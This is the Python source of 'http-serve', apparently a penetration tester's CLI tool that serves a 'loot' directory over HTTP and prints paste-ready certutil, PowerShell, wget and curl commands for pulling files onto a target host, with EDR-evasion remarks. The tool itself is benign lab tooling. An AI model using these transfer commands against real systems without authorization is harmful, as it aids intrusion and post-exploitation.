#!/usr/bin/env python3
"""
http-serve

Spins up `python3 -m http.server` in my loot dir and prints the exact
download commands to paste on the target - certutil for Windows (my
preferred method), wget/curl for Linux - with my tun0 VPN IP already
filled in, then shows me every request the target makes.

Solves the 2am problem of fumbling the IP/port/path three times mid-shell,
and the follow-up problem of not knowing whether the box actually pulled
the file.

Full writeup + usage examples: see README.md. Short version:

    sudo http-serve serve /tmp/loot
    http-serve cmds /tmp/loot --os windows
    http-serve ip

Serves files and prints commands - it never reaches out to the target or
runs anything on it. All it does on the wire is answer GET requests for
files I put in the loot dir myself.
"""

from __future__ import annotations

import argparse
import re
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional
from urllib.parse import quote

from . import __version__
from ._common.banner import render_banner
from ._common.cli import ToolParser, add_global_flags, build_epilog
from ._common.exits import EXIT_INTERRUPTED, EXIT_OK, EXIT_UNAVAILABLE, EXIT_USAGE
from ._common.jsonout import emit as emit_json
from ._common.jsonout import envelope
from ._common.text import bold, fmt_duration, scrub
from ._common.ui import RICH as _RICH
from ._common.ui import Console, Table
from ._common.validate import ValidationError, safe_dir, validate_iface, validate_port
from ._common.validate import validate_ip as validate_lhost

DEFAULT_PORT = 80  # matches the File-Transfer card; needs sudo to bind
WINDOWS_DEST_DIR = r"C:\Temp"       # where certutil/IWR drop the file on the target
LINUX_DEST_DIR = "/tmp"             # where wget/curl drop the file on the target

# Interfaces to probe for the VPN IP, in the order I actually use them.
VPN_INTERFACES = ("tun0", "tun1", "tap0")

_IP_INET_RE = re.compile(r"inet\s+(\d+\.\d+\.\d+\.\d+)")
# A loot filename that would break a shell one-liner if I pasted it blind.
_DANGEROUS_NAME_CHARS = (";", "|", "&", "$", "`", "\n", "\r", " ", "'", '"')



class PortBusy(RuntimeError):
    """Port already bound - gets its own exit code so a wrapper can react."""


# --- finding my own IP (the whole point of the tool) ---

def _ip_from_ip_cmd(iface: str) -> Optional[str]:
    """Parse `ip -4 -o addr show dev <iface>` for its inet address."""
    if shutil.which("ip") is None:
        return None
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "dev", iface],
            shell=False, check=False, capture_output=True, text=True, timeout=10,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
    if result.returncode != 0:
        return None  # interface probably doesn't exist - not an error, just skip it
    match = _IP_INET_RE.search(result.stdout)
    return match.group(1) if match else None


def _ip_from_ifconfig(iface: str) -> Optional[str]:
    """Fallback for boxes without iproute2 - parse `ifconfig <iface>`."""
    if shutil.which("ifconfig") is None:
        return None
    try:
        result = subprocess.run(
            ["ifconfig", iface],
            shell=False, check=False, capture_output=True, text=True, timeout=10,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
    if result.returncode != 0:
        return None
    match = _IP_INET_RE.search(result.stdout)
    return match.group(1) if match else None


def detect_vpn_ip(preferred_iface: Optional[str] = None) -> tuple[Optional[str], Optional[str]]:
    """Return (ip, iface) for the first VPN interface that has an inet address.

    Checks tun0 first because that's what the OpenVPN profile hands me on
    exam day; tap0 is only there for the odd bridged setup. Returns the
    interface too so the banner can tell me *which* one it locked onto -
    picking the wrong NIC and serving on the LAN IP is the kind of quiet
    mistake that eats ten minutes before you notice the target can't reach you.
    """
    order = ([preferred_iface] if preferred_iface else []) + list(VPN_INTERFACES)
    for iface in order:
        if not iface:
            continue
        ip = _ip_from_ip_cmd(iface) or _ip_from_ifconfig(iface)
        if ip:
            return ip, iface
    return None, None


def resolve_lhost(args: argparse.Namespace) -> tuple[str, str]:
    iface = validate_iface(args.iface) if args.iface else None
    if args.lhost:
        return validate_lhost(args.lhost), iface or "manual"
    lhost, found = detect_vpn_ip(iface)
    if not lhost:
        raise ValidationError(
            "Couldn't find a VPN IP on "
            f"{', '.join((iface,) if iface else VPN_INTERFACES)}. "
            "Is the VPN up? Pass --lhost 10.10.14.x to set it manually."
        )
    return lhost, found or "?"


# --- building the paste-ready commands ---

def check_loot_name(name: str) -> Optional[str]:
    """Flag a filename that would need quoting before it's shell-safe.

    I don't rewrite the name - I just warn, because the fix is to rename the
    file on my side, not to paste a mangled command onto the target.
    """
    if any(ch in name for ch in _DANGEROUS_NAME_CHARS):
        return name
    return None


def url_for(lhost: str, port: int, filename: str = "<file>") -> str:
    """http://<lhost>[:port]/<file>, dropping :80 the way the notes do."""
    host = f"{lhost}:{port}" if port != DEFAULT_PORT else lhost
    # <file> is a literal placeholder; real names get percent-encoded so a
    # space or '#' in a loot name doesn't quietly truncate the URL.
    path = filename if filename == "<file>" else quote(filename)
    return f"http://{host}/{path}"


def windows_cmds(lhost: str, port: int, filename: str = "<file>") -> list[str]:
    """certutil first (my go-to), IWR as the EDR-flagged-certutil fallback."""
    url = url_for(lhost, port, filename)
    dest = f"{WINDOWS_DEST_DIR}\\{filename}"
    return [
        f"certutil -urlcache -split -f {url} {dest}",
        f'powershell -c "IWR {url} -OutFile {dest}"',
    ]


def linux_cmds(lhost: str, port: int, filename: str = "<file>") -> list[str]:
    """wget then curl - whichever the box happens to ship with."""
    url = url_for(lhost, port, filename)
    dest = f"{LINUX_DEST_DIR}/{filename}"
    return [
        f"wget {url} -O {dest}",
        f"curl {url} -o {dest}",
    ]


def list_loot(outdir: Path) -> list[str]:
    """Top-level, non-hidden regular files - the stuff I'd actually serve."""
    return [
        p.name for p in sorted(outdir.iterdir())
        if p.is_file() and not p.name.startswith(".")
    ]


# --- output ---

def render(lhost: str, iface: str, port: int, outdir: Path, os_choice: str) -> None:
    show_win = os_choice in ("windows", "both")
    show_lin = os_choice in ("linux", "both")
    loot = list_loot(outdir)
    base = url_for(lhost, port).rsplit("/", 1)[0]

    if _RICH:
        console = Console()
        console.print(f"[bold green]Serving[/bold green] {outdir}  ->  "
                      f"[cyan]{base}/[/cyan]  (iface [magenta]{iface}[/magenta])",
                      highlight=False)
    else:
        print(f"[*] Serving {outdir}  ->  {base}/  (iface {iface})")

    # Placeholder template first - always useful even with an empty loot dir.
    print("\n=== paste template (replace <file>) ===")
    if show_win:
        print("# Windows")
        for cmd in windows_cmds(lhost, port):
            print(f"  {cmd}")
    if show_lin:
        print("# Linux")
        for cmd in linux_cmds(lhost, port):
            print(f"  {cmd}")

    if not loot:
        print(f"\n[!] No files in {outdir} yet - drop your loot there and re-run "
              "to get per-file lines.")
        return

    # Then the auto-filled lines for whatever's sitting in the loot dir.
    for name in loot:
        if check_loot_name(name):
            print(f"\n[!] Skipping '{scrub(name)}' - has shell-unsafe characters; "
                  "rename it before serving.")
            continue
        print(f"\n=== {scrub(name)} ===")
        if show_win:
            for cmd in windows_cmds(lhost, port, name):
                print(f"  {cmd}")
        if show_lin:
            for cmd in linux_cmds(lhost, port, name):
                print(f"  {cmd}")


def render_table(lhost: str, port: int, outdir: Path, os_choice: str,
                 console: Optional["Console"] = None) -> None:
    """At-a-glance table of the primary command per file (rich only)."""
    if not _RICH:
        return
    loot = [n for n in list_loot(outdir) if not check_loot_name(n)]
    if not loot:
        return
    console = console or Console()
    table = Table(title="Primary download command per file", show_lines=False)
    table.add_column("File", style="cyan", no_wrap=True)
    if os_choice in ("windows", "both"):
        table.add_column("Windows (certutil)")
    if os_choice in ("linux", "both"):
        table.add_column("Linux (wget)")
    for name in loot:
        row = [scrub(name)]
        if os_choice in ("windows", "both"):
            row.append(windows_cmds(lhost, port, name)[0])
        if os_choice in ("linux", "both"):
            row.append(linux_cmds(lhost, port, name)[0])
        table.add_row(*row)
    console.print()
    console.print(table)


def build_json(lhost: str, iface: str, port: int, outdir: Path, os_choice: str) -> dict:
    files = []
    for name in list_loot(outdir):
        entry = {
            "name": name,
            "shell_safe": check_loot_name(name) is None,
            "url": url_for(lhost, port, name),
        }
        if os_choice in ("windows", "both"):
            entry["windows"] = windows_cmds(lhost, port, name)
        if os_choice in ("linux", "both"):
            entry["linux"] = linux_cmds(lhost, port, name)
        files.append(entry)
    shareable = sum(1 for f in files if f["shell_safe"])
    return envelope(
        tool="http-serve",
        tool_version=__version__,
        subject=f"{lhost}:{port}",
        summary=f"{len(files)} file(s) in {outdir.name}, {shareable} shell-safe",
        data={
            "lhost": lhost,
            "iface": iface,
            "port": port,
            "base_url": url_for(lhost, port).rsplit("/", 1)[0] + "/",
            "directory": str(outdir),
            "files": files,
        },
    )


def write_json(payload: dict, target: str) -> None:
    emit_json(payload, target)


# --- serving ---

def port_is_free(port: int) -> bool:
    """Check before handing off, so a busy port is a sentence not a traceback."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(("0.0.0.0", port))
        except PermissionError:
            return True   # <1024 without root - sudo's problem, not ours
        except OSError:
            return False
    return True


# http.server logs to stderr in the classic format:
#   10.10.10.10 - - [23/Aug/2026 16:20:01] "GET /linpeas.sh HTTP/1.1" 200 -
_REQ_RE = re.compile(
    r'^(?P<ip>\S+) - - \[(?P<ts>[^\]]+)\] "(?P<method>[A-Z]+) (?P<path>\S*)[^"]*" (?P<code>\d{3})'
)


def _colour_for(code: int) -> str:
    if code < 300:
        return "1;32"
    if code < 400:
        return "1;33"
    return "1;31"


def print_request(line: str, tty: bool) -> Optional[tuple[str, str, int]]:
    """Pretty-print one server log line. Returns (ip, path, code) for a request."""
    match = _REQ_RE.match(line)
    if not match:
        stripped = scrub(line, 300)
        if stripped:
            print(f"   {stripped}", flush=True)
        return None

    ip = match.group("ip")
    path = scrub(match.group("path"), 120)
    code = int(match.group("code"))
    stamp = match.group("ts")
    clock = stamp.split()[-1] if " " in stamp else stamp
    code_txt = f"\033[{_colour_for(code)}m{code}\033[0m" if tty else str(code)
    print(f"  {clock}  {ip:<15}  {match.group('method'):<4} {path:<40} {code_txt}", flush=True)
    return ip, path, code


def session_summary(hits: list[tuple[str, str, int]], elapsed: float) -> str:
    if not hits:
        return f"no requests in {fmt_duration(elapsed)} - did the target reach you?"
    served = [h for h in hits if h[2] < 400]
    missed = len(hits) - len(served)
    clients = len({ip for ip, _, _ in hits})
    files = len({path for _, path, _ in served})
    bits = [f"{len(hits)} request(s) from {clients} host(s)", f"{files} file(s) served"]
    if missed:
        bits.append(f"{missed} miss(es)")
    bits.append(fmt_duration(elapsed))
    return " \u00b7 ".join(bits)


def serve(outdir: Path, port: int, use_sudo: bool, raw: bool) -> int:
    """Hand off to `python3 -m http.server` so it's the exact command I know.

    --directory keeps me from having to cd first. Normally the server's log is
    piped back through print_request() so each pull off the target reads
    cleanly and gets counted; --raw skips that and lets the child write
    straight to the terminal, which is the escape hatch if the parsing ever
    misbehaves at a moment when I can't afford to debug it.
    """
    if not port_is_free(port):
        raise PortBusy(
            f"Port {port} is already in use - something else is bound to it "
            "(an earlier http-serve?). Free it, or pass --port 8000."
        )

    cmd = [sys.executable or "python3", "-m", "http.server", str(port),
           "--directory", str(outdir)]
    if use_sudo and port < 1024:
        if shutil.which("sudo") is None:
            raise RuntimeError("sudo not found on PATH (pass --no-sudo if you're already root).")
        cmd = ["sudo", *cmd]

    print(f"\n{bold('>> ' + ' '.join(cmd))}")
    print("   Ctrl+C to stop. Requests from the target appear below.\n")

    if raw:
        try:
            # Deliberately no timeout: this is a server you stop with Ctrl-C, not a
            # command that should finish. Same documented exception as script-logger's
            # interactive session. Return code is handled by the caller.
            return subprocess.run(cmd, shell=False, check=False).returncode
        except FileNotFoundError as exc:
            raise RuntimeError("python3 (or sudo) not found on PATH.") from exc
        except KeyboardInterrupt:
            print("\n[*] Stopped.")
            return EXIT_OK

    tty = sys.stdout.isatty()
    started = time.monotonic()
    hits: list[tuple[str, str, int]] = []

    try:
        # Long-running by design (see above) - no timeout, stopped by Ctrl-C. The
        # pipe is what lets each request be reprinted as a parsed, scrubbed line.
        proc = subprocess.Popen(
            cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, errors="replace",
        )
    except FileNotFoundError as exc:
        raise RuntimeError("python3 (or sudo) not found on PATH.") from exc

    rc = EXIT_OK
    try:
        for line in proc.stdout or []:
            hit = print_request(line.rstrip("\n"), tty)
            if hit:
                hits.append(hit)
        rc = proc.wait()
    except KeyboardInterrupt:
        rc = EXIT_INTERRUPTED
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except PermissionError:
            pass  # sudo-owned child; Ctrl+C already hit the whole process group
        except subprocess.TimeoutExpired:
            proc.kill()
    finally:
        print(f"\n{bold(session_summary(hits, time.monotonic() - started))}")

    return EXIT_OK if rc in (0, EXIT_INTERRUPTED) else rc


# --- cli ---

_EXAMPLES = """examples:
  sudo http-serve serve /tmp/loot
      serve on :80 and show every request the target makes

  http-serve serve /tmp/loot --port 8000 --no-sudo
      unprivileged port, no sudo

  http-serve cmds /tmp/loot --os windows
      just print the certutil lines, start nothing

  http-serve cmds /tmp/loot --json - | jq -r '.data.files[].url'
      pipe the URLs somewhere else

  http-serve ip
      what's my tun0 again?
"""


def add_target_options(sub: argparse.ArgumentParser) -> None:
    sub.add_argument("--no-banner", action="store_true", help=argparse.SUPPRESS)
    sub.add_argument("directory", nargs="?", default="loot",
                     help="loot directory to serve / build commands from (default: ./loot)")
    net = sub.add_argument_group("addressing")
    net.add_argument("--port", type=int, default=DEFAULT_PORT, metavar="PORT",
                     help=f"HTTP port (default: {DEFAULT_PORT}, needs sudo)")
    net.add_argument("--lhost", metavar="IP",
                     help="override the served IP instead of auto-detecting from tun0")
    net.add_argument("--iface", metavar="NAME",
                     help=f"prefer this interface when auto-detecting "
                          f"(tried: {', '.join(VPN_INTERFACES)})")


def build_parser() -> argparse.ArgumentParser:
    parser = ToolParser(
        prog="http-serve",
        description="Serves a loot directory over HTTP and prints the exact download\n"
                    "commands to paste on the target, with your VPN IP already filled in.\n"
                    "It only answers GETs for files you put there - it never touches the target.",
        epilog=build_epilog(_EXAMPLES),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_global_flags(parser, "http-serve", __version__)
    subs = parser.add_subparsers(dest="command", metavar="<command>")

    srv = subs.add_parser(
        "serve", help="print the commands, then serve the directory",
        description="Print the transfer commands, then serve the loot directory and log "
                    "every request the target makes.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_target_options(srv)
    out = srv.add_argument_group("output")
    out.add_argument("--os", choices=["windows", "linux", "both"], default="both",
                     help="which target OS to print commands for (default: both)")
    out.add_argument("--raw", action="store_true",
                     help="don't parse the server log - let it write straight to the terminal")
    out.add_argument("--no-sudo", action="store_true",
                     help="don't prefix the server with sudo")

    cmds = subs.add_parser(
        "cmds", help="print the transfer commands only, don't serve",
        description="Build the download commands and print them. Starts nothing, binds nothing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_target_options(cmds)
    cout = cmds.add_argument_group("output")
    cout.add_argument("--os", choices=["windows", "linux", "both"], default="both",
                      help="which target OS to print commands for (default: both)")
    cout.add_argument("--json", metavar="FILE", dest="json_out",
                      help="write machine-readable JSON here ('-' for stdout, which hides the text)")

    ipc = subs.add_parser(
        "ip", help="show the VPN IP and interface this would serve on",
        description="Report which interface and address the transfer commands would use.",
    )
    ipc.add_argument("--no-banner", action="store_true", help=argparse.SUPPRESS)
    ipc.add_argument("--iface", metavar="NAME", help="prefer this interface")
    ipc.add_argument("--json", metavar="FILE", dest="json_out",
                     help="write machine-readable JSON here ('-' for stdout)")

    return parser


def cmd_ip(args: argparse.Namespace) -> int:
    iface = validate_iface(args.iface) if args.iface else None
    lhost, found = detect_vpn_ip(iface)
    if not lhost:
        raise ValidationError(
            "Couldn't find a VPN IP on "
            f"{', '.join((iface,) if iface else VPN_INTERFACES)}. Is the VPN up?"
        )
    if args.json_out:
        write_json(
            envelope(
                tool="http-serve",
                tool_version=__version__,
                subject=lhost,
                summary=f"VPN IP {lhost} on {found}",
                data={"lhost": lhost, "iface": found},
            ),
            args.json_out,
        )
    else:
        print(f"{lhost}  (iface {found})")
    return EXIT_OK


def run_command(args: argparse.Namespace) -> int:
    if args.command == "ip":
        return cmd_ip(args)

    port = validate_port(args.port)
    outdir = safe_dir(args.directory)
    lhost, iface = resolve_lhost(args)

    if args.command == "cmds":
        quiet = args.json_out == "-"
        if not quiet:
            render(lhost, iface, port, outdir, args.os)
            render_table(lhost, port, outdir, args.os)
        if args.json_out:
            write_json(build_json(lhost, iface, port, outdir, args.os), args.json_out)
        return EXIT_OK

    render(lhost, iface, port, outdir, args.os)
    render_table(lhost, port, outdir, args.os)
    return serve(outdir, port, use_sudo=not args.no_sudo, raw=args.raw)


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        render_banner("http-serve", __version__)
        parser.print_help()
        return EXIT_USAGE

    # Never over JSON-to-stdout: that output is meant to be piped into something.
    if not getattr(args, "no_banner", False) and getattr(args, "json_out", None) != "-":
        render_banner("http-serve", __version__)

    try:
        return run_command(args)
    except PortBusy as exc:
        print(f"error: {exc}", file=sys.stderr)
        return EXIT_UNAVAILABLE
    except (ValidationError, RuntimeError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return EXIT_USAGE
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
        return EXIT_INTERRUPTED


def main_cli() -> int:
    """Console-script entry point (see pyproject [project.scripts])."""
    return main()


if __name__ == "__main__":
    sys.exit(main_cli())
